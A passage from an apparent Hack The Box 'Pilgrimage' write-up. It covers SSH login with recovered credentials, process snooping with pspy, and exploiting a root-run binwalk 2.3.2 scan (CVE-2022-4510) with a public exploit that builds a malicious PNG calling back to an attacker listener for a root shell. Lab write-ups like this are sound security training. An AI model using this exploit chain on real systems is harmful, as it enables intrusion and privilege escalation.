</code></pre></div></div> <p>pass the file to a hex to string conversion:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="sh">"</span><span class="s">print(bytes.fromhex(open(</span><span class="sh">'</span><span class="s">hex_data.txt</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="s">).read().strip()))</span><span class="sh">"</span>
</code></pre></div></div> <p>Find a password: <img src="/assets/img/20231016-pilgrimage-5a.png" alt="Found password" class="auto-resize"/></p> <h1 id="logging-in">Logging in</h1> <p>User the credentials <code class="language-plaintext highlighter-rouge">emily:abigchonkyboi123</code> to log in via ssh. <img src="/assets/img/20231016-pilgrimage-6.png" alt="SSH in" class="auto-resize"/></p> <h1 id="privilege-escalation">Privilege escalation</h1> <p>No sudo privs</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>emily@pilgrimage:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>emily:
Sorry, user emily may not run <span class="nb">sudo </span>on pilgrimage.
emily@pilgrimage:~<span class="err">$</span>
</code></pre></div></div> <p>Upload <a href="https://github.com/DominicBreuker/pspy">pspy64</a>.</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>emily@pilgrimage:~/test<span class="nv">$ </span><span class="nb">chmod</span> +x pspy64
emily@pilgrimage:~/test<span class="nv">$ </span>./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events <span class="o">(</span><span class="nv">colored</span><span class="o">=</span><span class="nb">true</span><span class="o">)</span>: <span class="nv">processes</span><span class="o">=</span><span class="nb">true</span> | file-system-events<span class="o">=</span><span class="nb">false</span> <span class="o">||</span>| Scanning <span class="k">for </span>processes every 100ms and on inotify events <span class="o">||</span>| Watching directories: <span class="o">[</span>/usr /tmp /etc /home /var /opt] <span class="o">(</span>recursive<span class="o">)</span> | <span class="o">[]</span> <span class="o">(</span>non-recursive<span class="o">)</span>
Draining file system events due to startup...
<span class="k">done
</span>2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>1000  <span class="nv">PID</span><span class="o">=</span>1613   | ./pspy64
2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1605   |
2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1604   |
2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1584   |
2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>1000  <span class="nv">PID</span><span class="o">=</span>1528   | <span class="nt">-bash</span>
2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>1000  <span class="nv">PID</span><span class="o">=</span>1527   | sshd: emily@pts/0
2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1515   |
2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>1000  <span class="nv">PID</span><span class="o">=</span>1509   | <span class="o">(</span>sd-pam<span class="o">)</span>
2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>1000  <span class="nv">PID</span><span class="o">=</span>1507   | /lib/systemd/systemd <span class="nt">--user</span>
2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1504   | sshd: emily <span class="o">[</span>priv]
2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1444   |
</code></pre></div></div> <p>Found that the root user executes a file name <code class="language-plaintext highlighter-rouge">malwarescan.sh</code>, which is accessible by the <code class="language-plaintext highlighter-rouge">emily</code> user. ![[20231016-pilgrimage-7.png]]</p> <p>Output of the file <code class="language-plaintext highlighter-rouge">malwarescan.sh</code>:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>emily@pilgrimage:~/test<span class="nv">$ </span><span class="nb">cat</span> /usr/sbin/malwarescan.sh
<span class="c">#!/bin/bash</span>

<span class="nv">blacklist</span><span class="o">=(</span><span class="s2">"Executable script"</span> <span class="s2">"Microsoft executable"</span><span class="o">)</span>

/usr/bin/inotifywait <span class="nt">-m</span> <span class="nt">-e</span> create /var/www/pilgrimage.htb/shrunk/ | <span class="k">while </span><span class="nb">read </span>FILE<span class="p">;</span> <span class="k">do
        </span><span class="nv">filename</span><span class="o">=</span><span class="s2">"/var/www/pilgrimage.htb/shrunk/</span><span class="si">$(</span>/usr/bin/echo <span class="s2">"</span><span class="nv">$FILE</span><span class="s2">"</span> | /usr/bin/tail <span class="nt">-n</span> 1 | /usr/bin/sed <span class="nt">-n</span> <span class="nt">-e</span> <span class="s1">'s/^.*CREATE //p'</span><span class="si">)</span><span class="s2">"</span>
        <span class="nv">binout</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span>/usr/local/bin/binwalk <span class="nt">-e</span> <span class="s2">"</span><span class="nv">$filename</span><span class="s2">"</span><span class="si">)</span><span class="s2">"</span>
        <span class="k">for </span>banned <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="nv">blacklist</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
                if</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$binout</span><span class="s2">"</span> <span class="o">==</span> <span class="k">*</span><span class="s2">"</span><span class="nv">$banned</span><span class="s2">"</span><span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
                        /usr/bin/rm <span class="s2">"</span><span class="nv">$filename</span><span class="s2">"</span>
                        <span class="nb">break
                </span><span class="k">fi
        done
done</span>
</code></pre></div></div> <p>The script seems monitors <code class="language-plaintext highlighter-rouge">var/www/pilgrimage.htb/shrunk/</code> for any newly created files. When a new file is created, it runs various checks to see if the file is of a “blacklisted” type, and if so, removes the file.</p> <p>It is using <code class="language-plaintext highlighter-rouge">binwalk</code> version that is vulnerable</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>emily@pilgrimage:~/test<span class="nv">$ </span>binwalk

Binwalk v2.3.2
</code></pre></div></div> <p>In the context of the script, binwalk is used to identify the type or characteristics of the newly-created files. If the file has characteristics that match any in a blacklist, the file is removed.</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/pilgrimage/exploits]
└─<span class="nv">$ </span>searchsploit <span class="nt">-m</span> 51249
  Exploit: Binwalk v2.3.2 - Remote Command Execution <span class="o">(</span>RCE<span class="o">)</span>
      URL: https://www.exploit-db.com/exploits/51249
     Path: /usr/share/exploitdb/exploits/python/remote/51249.py
    Codes: CVE-2022-4510
 Verified: False
File Type: ASCII text, with very long lines <span class="o">(</span>614<span class="o">)</span>
Copied to: /home/kali/Documents/HTB-Machines/pilgrimage/exploits/51249.py
</code></pre></div></div> <p>Use the exploit to prepare the file:</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/pilgrimage/exploits]
└─<span class="nv">$ </span><span class="nb">chmod</span> +x 51249.py

┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/pilgrimage/exploits]
└─<span class="nv">$ </span>python3 51249.py image.png 10.10.14.12 443

<span class="c">################################################</span>
<span class="nt">------------------CVE-2022-4510----------------</span>
<span class="c">################################################</span>
<span class="nt">--------Binwalk</span> Remote Command Execution--------
<span class="nt">------Binwalk</span> 2.1.2b through 2.3.2 included-----
<span class="nt">------------------------------------------------</span>
<span class="c">################################################</span>
<span class="nt">----------Exploit</span> by: Etienne Lacoche-----------
<span class="nt">---------Contact</span> Twitter: @electr0sm0g----------
<span class="nt">------------------Discovered</span> by:----------------
<span class="nt">---------Q</span><span class="nb">.</span> Kaiser, ONEKEY Research Lab---------
<span class="nt">---------Exploit</span> tested on debian 11------------
<span class="c">################################################</span>


You can now rename and share binwalk_exploit and start your <span class="nb">local </span>netcat listener.


┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/pilgrimage/exploits]
└─<span class="nv">$ </span><span class="nb">ls
</span>51249.py  binwalk_exploit.png  CVE-2022-44268  image.png  pspy64
</code></pre></div></div> <p>Upload the file to <code class="language-plaintext highlighter-rouge">/var/www/pilgrimage.htb/shrunk</code> and start a listener.</p> <p><img src="/assets/img/20231016-pilgrimage-8.png" alt="Image of PE" class="auto-resize"/></p> <p>Done and dusted!</p>]]></content><author><name></name></author><category term="HTB-Machines"/><category term="easy-box"/><category term="htb"/><category term="CTF"/><category term="RCE"/><category term="LFI"/><category term="AFR"/><summary type="html"><![CDATA[Pilgrimage - Hack The Box write-up]]></summary></entry></feed>